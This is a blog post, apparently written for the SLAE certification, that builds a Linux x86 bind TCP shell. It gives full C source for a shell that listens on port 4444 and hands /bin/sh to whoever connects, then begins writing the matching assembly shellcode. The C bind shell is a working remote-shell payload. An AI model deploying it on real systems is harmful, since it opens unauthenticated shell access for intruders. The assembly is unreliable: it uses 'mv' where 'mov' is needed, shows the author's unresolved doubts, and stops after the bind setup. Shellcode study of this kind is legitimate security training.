# SLAE: Assignment 1
This blog entry is 1 of a 7 part series of assignments required to earn the SLAE (Security Linux Assembly Expert) Certification.

This assignment will see us create and examine shellcode with a Bind TCP shell as the payload.

We start by retrieving a bind TCP shell written in C so that we can break it down to determine how we wil go about building our own shellcode:
```
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int socketfd; 
int socketid; 

struct sockaddr_in hostaddr; 

int main() { 
    //Create socket, which returns the file descriptor so we can interact with it
    socketfd = socket(PF_INET, SOCK_STREAM, 0); //here we specify that it is an ipv4 stream type of communication and protocol is 0 (TCP/IP)

    //Initialize sockaddr struct 
    hostaddr.sin_family = AF_INET; //address family set to AF_INET(which is ipv4)
    hostaddr.sin_port = htons(4444); //htons is neccesary so endianness does not reverse how the port is stored in memory, thus scrambling it
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY); //htonl is neccesary so endianness does not reverse how the address is stored in memory, thus scrambling it

    //Bind our socket as defined
    bind(socketfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    //Start Listening
    listen(socketfd, 2); 

    //Accept incoming connection 
    socketid = accept(socketfd, NULL, NULL); 

    //Create new file descriptors for stdin stdout and stderror, so the client shell will recieve these from our socket 
    dup2(socketid, 0); 
    dup2(socketid, 1); 
    dup2(socketid, 2); 

    //Use execve to excecute /bin/sh from within our program
    execve("//bin/sh", NULL, NULL); //extra slash is to ensure we have to 8bit values to push onto stack later on
} 
```

After looking at the above we know we will need to make use of the following syscalls and functions under socketcall:

* __NR_socketcall	  102
       * SYS_SOCKET 	1
       * SYS_BIND  	    2
       * SYS_CONNECT	3
       * SYS_LISTEN 	4
       * SYS_ACCEPT 	5
* __NR_dup		       41
* __NR_execve		   11

Now, the SYS_SOCKET function takes 3 args as per man page:

<socket_options>

The first arg, __domain__ will be set to AF_INET. As per our .c code, we already know what it represents (IPv4)
The second arg, __type__, will be set to SOCK_STREAM. Again we know what this does thanks to the breakdown of our .c code.
The third and final arg __protocol__ will be 0, as according to the man page this only changes under specific circumstances and at this point is beyond the scope of the exercise.

I ended up taking the easy route and using google to obtain these values, as this was the path of least resistance.
```
AF_INET		2 
SOCK_STREAM	1
```
To start converting to assembly we need to understand that syscalls get stored in EAX, with subsequent args going in EBX, ECX, EDX etc.
For socket call:
* syscall value obviously goes in al
* function type (socket, bind, listen etc) goes in bl
* args to function go in ecx.

We need to both zero out our registers with XOR, and place our values in the lowest possible register, example for setting up socketcall below:
```
xor eax, eax ; we do this both to create a 0x0 value and get eax ready
push eax ; push 0x0 as third arg
push 0x1 ; for second arg, the value of SOCK_STREAM
push 0x2 ; first arg is AF_INET, set address family to ipv4
xor ecx, ecx ; clear out ecx
mov ecx, esp ; move our arg values into ecx (place a pointer to these values with an address stored in ecx)
mv al, 102   ; we move the socketcall syscall value into al, to avoid padding
mv bl, 1     ; we set function to 1, which is the value of socket (this will change later on to accomodate accept, listen, bind etc)
int 0x80 ; call system interrupt 
mov esi, eax ; we store the returning value of our syscall for later use in other functions
```
We now move onto setting up the bind section of the shell.
A quick rundown of what we need to achieve here is:
* set sycall as socketcall again
* this time function will be 2 (SYS_BIND)
* we will need to reference the result of our previously executed syscall (now stored in esi)
* Specify listening address as 0.0.0.0 (all available)
* Specify the port value (/x11/x5Câ€¬, then /x5C/x11 for little endian)
* Specify adress length

I ended up having to do some further research into setting the IP address, as per the man page for bind, the second arg is struct sockaddr, as per man 7 ip this means the address needs to consist of: sin_family, sin_port and sin_addr

```
xor ebx, ebx
;create struct sockaddr
push ebx ; push 0x0 on for listening address
push word 0x5C11 ; push on reversed value of 4444
push 0x2 ; push value of AF_INET MAY NEED TO BE WORD??
mov ecx, esp ; store our created sockaddr struc in ecx
push 0x10 ; push length of address on (16) third arg
push ecx ; push our created structure on as second arg
push esi ; push created socket fd on as first arg
mov ecx, esp ; move our values into ecx for the syscall
mv bl, 2 ; we set function to 2, which is the value of bind
xor eax, eax
mv al, 102
```
